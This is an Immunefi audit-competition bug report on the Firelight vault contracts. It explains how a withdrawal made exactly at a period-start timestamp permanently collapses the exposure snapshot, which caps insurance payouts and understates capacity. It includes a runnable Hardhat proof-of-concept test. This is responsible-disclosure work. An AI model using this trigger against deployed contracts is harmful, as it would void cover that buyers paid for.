# 89424 sc high a withdrawal at the exact period boundary permanently collapses the period s exposure snapshot voiding paid for cover and denying capacity

**Submitted on Aug 19th 2026 at 08:38:18 UTC by @deltasec for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89424
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Theft of unclaimed yield
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

When the block timestamp coincides with a period start `T`, every withdrawal landing in that block permanently slashes the amount that can be paid for any incident captured in the period. Three facts make this periodic vulnerability possible:

1. `totalAssetsAt(T)` returns whatever was last pushed at key `T` — `Trace256.push` appends on a new key and **overwrites in place** on an equal one (`Checkpoints.sol:207-209`) — and trace keys are monotonic, so once the value at key `T` is written down it can never be raised again.
2. The vault answers two questions inconsistently about the *same* withdrawal: `_requestWithdraw` books the withdrawn shares into bucket `currentPeriod() + 1` — the **next, still-exposed** period (`FirelightVault.sol:1008`) — while `_logTrace` writes the *reduced* total-assets value onto key `T` itself (`:1055`).
3. Key `T` is precisely the key the rest of the protocol reads as the period's opening capital: `payout` reads it as `capturePeriodStart` (`:911`), and the allocator reads it in `_computeAvailableCapacity` (`CoverOrderAllocator.sol:711`), which gates every commitment through `_validateMatchingCapacity` (`:400-402`).

So the assets are simultaneously *exposed* (booked into the still-covered bucket, and added back by `activePayableAmount` at `:916` so exposed assets cannot escape by withdrawing first) and *absent* (erased from the snapshot that caps the claim). The cap is the smaller of the two, so the cap wins.

The consequence is permanent: **every incident ever captured in that period is capped at the collapsed value** — at the extreme, zero — even though the vault physically holds the assets and its own `activePayableAmount` proves it could have paid. The same collapsed key also drives capacity, so commitments for the period can be rejected outright.

## Vulnerability Details

**Root cause — bucket and key disagree at the boundary.** `contracts/core/FirelightVault.sol`:

```solidity
uint256 period = currentPeriod() + 1;              // :1008 -> bucket C+1 = STILL EXPOSED
_traceTotalAssets.push(ts, _totalAssets - assets); // :1055 -> totalAssetsAt(T) DROPS
```

At `t == T` the period that opens at `T` is already `currentPeriod()`, so the withdrawal books into `C + 1` and stays slashable for incidents captured in period `C`. The matching trace write, however, lands on key `T` — the key that period `C` is measured by.

**The window is exactly one second.** Measured by the PoC below (11,000 in the vault, whale withdraws 10,000, full 11,000 claimed against an incident captured in the period):

```
offset | booked bucket   | vault holds | cap    | payable | paid
    -1 | C   (exited)    |      11,000 |  1,000 |   1,000 |  1,000
     0 | C+1 (exposed)   |      11,000 |  1,000 |  11,000 |  1,000   <- cap != payable
    +1 | C+1 (exposed)   |      11,000 | 11,000 |  11,000 | 11,000
```

Offset `-1` is self-consistent and correct: the underwriter left before the period opened, so its assets are excluded from the cap *and* from the payable set. Offset `+1` is self-consistent the other way: the assets are in both. Only at offset `0` do the two disagree, and the smaller one — the cap — decides the claim. 10,000 of paid-for cover is voided while the vault holds every token.

**Consumers of the collapsed key**

| Consumer                                                        | Effect                                                                                                                                                                                                                            | Victim                  |
| --------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------- |
| `payout` (`FirelightVault.sol:911`)                             | the claim cap collapses, and the collapsed key is **permanent** — trace keys are monotonic, so `totalAssetsAt(T)` can never be raised again, and **every incident ever captured in that period is capped at the collapsed value** | cover buyers            |
| `_computeAvailableCapacity` (`CoverOrderAllocator.sol:711`)     | the period's opening capital is understated for the rest of the period, lowering sellable capacity                                                                                                                                | every buyer in the tree |
| `_validateMatchingCapacity` (`CoverOrderAllocator.sol:400-402`) | reverts with `MatchingCapacityOverflow` on a commitment that the vault's actual collateral supports                                                                                                                               | protocol revenue        |

**Trigger path**

1. Any share holder calls `withdraw`/`redeem` in the block whose timestamp equals a period start `T`.
2. `_requestWithdraw` books the shares into bucket `C+1` — the period that is still exposed (`:1008`).
3. `_logTrace` pushes `_totalAssets - assets` at key `T` (`:1055`, `Checkpoints.sol:207-209`).
4. `totalAssetsAt(T)` is now permanently understated. Every incident with `capturePeriodStart == T` is capped at the understated figure for the rest of time, and the allocator's capacity basis for the period is understated for the rest of the period.

## Impact Details

* **Permanent, irreparable voiding of paid-for cover.** Once key `T` is collapsed it can never be raised — trace keys are monotonic — so every incident ever captured in that period is capped at the collapsed value. The PoC shows a 50,000 refill inside the same period leaving `totalAssetsAt(T)` at 1,000 and a 51,000 claim still paying 1,000. If the whole vault exits at `T` the cap is **zero**: buyers who paid full premium for the period can never be paid anything, while the vault demonstrably holds the collateral and `activePayableAmount` reports it as present.
* **Understated capacity for the remainder of the period.** `_computeAvailableCapacity` derives the period's sellable capacity from the same collapsed key, so commitments the real collateral supports revert with `MatchingCapacityOverflow` — lost underwriting revenue for the period, and at the extreme no capacity at all.
* **Cost to trigger: one ordinary withdrawal in one specific block.** The loss falls on cover buyers and the protocol; no privileged role is involved.

The scope exclusion for "collateral drawdowns reducing coverage capacity" does not apply: this is not a drawdown. The collateral never left the vault, and `activePayableAmount` proves the vault could have paid.

## References

* `contracts/core/FirelightVault.sol:1008` — withdrawal booked into the still-exposed bucket
* `contracts/core/FirelightVault.sol:1055` — trace push at the boundary key
* `contracts/core/FirelightVault.sol:911`, `:916` — payout cap vs `activePayableAmount`
* `contracts/core/CoverOrderAllocator.sol:711`, `:400-402` — capacity basis and the commitment gate
* `Checkpoints.sol:207-209` — `Trace256.push`: append on a new key, in-place overwrite on an equal key
* Tested against commit `42f9ea5`, branch `v1_audit_ready`

## Proof of Concept

## Proof of Concept

Save as `test/poc.js` and run `npx hardhat test test/poc.js`. It uses only the project's own `test/setup/fixtures.js`; no harness or contract modifications are needed. Both tests pass against the unmodified code.

```js
const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers')
const { deployVault } = require('./setup/fixtures.js')
const { expect } = require('chai')
const { ethers } = require('hardhat')

const DAY = 86400, DEC = 6
const U = (x) => ethers.parseUnits(String(x), DEC)
const fmt = (x) => ethers.formatUnits(x, DEC).padStart(9)

// Two underwriters put 11,000 into the vault. The whale (10,000) withdraws `offset`
// seconds away from the period start T. An incident is then captured inside that period
// and a payout of the full 11,000 is requested.
async function atOffset(offset) {
  const ctx = await loadFixture(deployVault.bind(null, {
    decimals: DEC, period_configuration_duration: 7 * DAY, initial_deposit_limit: U(1000000)
  }))
  const v = ctx.firelight_vault
  const [whale, other] = ctx.users
  for (const u of [whale, other]) await ctx.utils.mintAndApprove(U(100000), u)

  await v.connect(whale).deposit(U(10000), whale.address)
  await v.connect(other).deposit(U(1000), other.address)

  const T = Number(await v.currentPeriodEnd())            // the next period start
  await time.setNextBlockTimestamp(T + offset)
  const rcpt = await (await v.connect(whale).withdraw(U(10000), whale.address, whale.address)).wait()

  const bookedBucket = rcpt.logs
    .map((l) => { try { return v.interface.parseLog(l) } catch { return null } })
    .find((x) => x && x.name === 'WithdrawRequest').args[3]

  if (offset < 0) await time.increaseTo(T + 1)            // enter the period under test
  const periodStart = await v.currentPeriodStart()
  const capturePeriod = await v.currentPeriod()
  const captureTs = Number(periodStart) + 60
  await time.increaseTo(captureTs)

  const live = await v.totalAssets()
  const r = {
    capturePeriod,
    bookedBucket,
    heldByVault: await ctx.token_contract.balanceOf(v.target),          // assets never left
    cap: await v.totalAssetsAt(periodStart),                            // what payout is capped by
    // activePayableAmount: live assets + the still-exposed withdrawal bucket
    payable: live + (await v.withdrawAssets(capturePeriod + 1n)),
    paid: await v.connect(ctx.payout_signer)
      .payout.staticCall(ctx.payout_receiver.address, U(11000), captureTs),
  }
  console.log(`   offset ${String(offset).padStart(2)} | bucket ${r.bookedBucket} | held ${fmt(r.heldByVault)}` +
              ` | cap ${fmt(r.cap)} | payable ${fmt(r.payable)} | paid ${fmt(r.paid)}`)
  return r
}

describe('V5 — a boundary withdrawal collapses the period-start exposure snapshot', function () {
  this.timeout(600000)

  it('the window is exactly one second: cap and payable disagree only at offset 0', async () => {
    // offset -1: the whale exits BEFORE the period opens. Its assets are excluded from the
    // cap and from the payable set alike -- self-consistent, and the correct outcome.
    const before = await atOffset(-1)
    expect(before.bookedBucket).to.equal(before.capturePeriod)   // not payable for this period
    expect(before.cap).to.equal(U(1000))
    expect(before.payable).to.equal(U(1000))
    expect(before.paid).to.equal(U(1000))

    // offset 0: the withdrawal books into capturePeriod + 1, so the assets are STILL exposed
    // and activePayableAmount counts them -- but the reduced total lands on key T, which is
    // exactly the key the cap is read from. The cap is smaller, so the cap wins.
    const at = await atOffset(0)
    expect(at.bookedBucket).to.equal(at.capturePeriod + 1n)      // still exposed
    expect(at.heldByVault).to.equal(U(11000))                    // vault physically holds it all
    expect(at.payable).to.equal(U(11000))                        // ...and knows it can pay it
    expect(at.cap).to.equal(U(1000))                             // ...but the snapshot says otherwise
    expect(at.paid).to.equal(U(1000))                            // 10,000 of paid-for cover voided

    // offset +1: identical actions one second later, and the claim pays in full.
    const after = await atOffset(1)
    expect(after.bookedBucket).to.equal(after.capturePeriod + 1n)
    expect(after.cap).to.equal(U(11000))
    expect(after.payable).to.equal(U(11000))
    expect(after.paid).to.equal(U(11000))
  })

  it('the collapse is permanent: no later deposit can raise key T', async () => {
    const ctx = await loadFixture(deployVault.bind(null, {
      decimals: DEC, period_configuration_duration: 7 * DAY, initial_deposit_limit: U(1000000)
    }))
    const v = ctx.firelight_vault
    const [whale, other] = ctx.users
    for (const u of [whale, other]) await ctx.utils.mintAndApprove(U(100000), u)

    await v.connect(whale).deposit(U(10000), whale.address)
    await v.connect(other).deposit(U(1000), other.address)

    const T = Number(await v.currentPeriodEnd())
    await time.setNextBlockTimestamp(T)
    await v.connect(whale).withdraw(U(10000), whale.address, whale.address)
    expect(await v.totalAssetsAt(T)).to.equal(U(1000))

    // Refill the vault far beyond its original balance, inside the same period.
    await time.increaseTo(T + 600)
    await v.connect(other).deposit(U(50000), other.address)
    expect(await v.totalAssets()).to.equal(U(51000))

    // Trace keys are monotonic, so key T can never be revised upward again.
    expect(await v.totalAssetsAt(T)).to.equal(U(1000))

    // Every incident captured in this period is capped at the collapsed value, for all time.
    const captureTs = T + 900
    await time.increaseTo(captureTs)
    expect(
      await v.connect(ctx.payout_signer)
        .payout.staticCall(ctx.payout_receiver.address, U(51000), captureTs)
    ).to.equal(U(1000))
  })
})
```
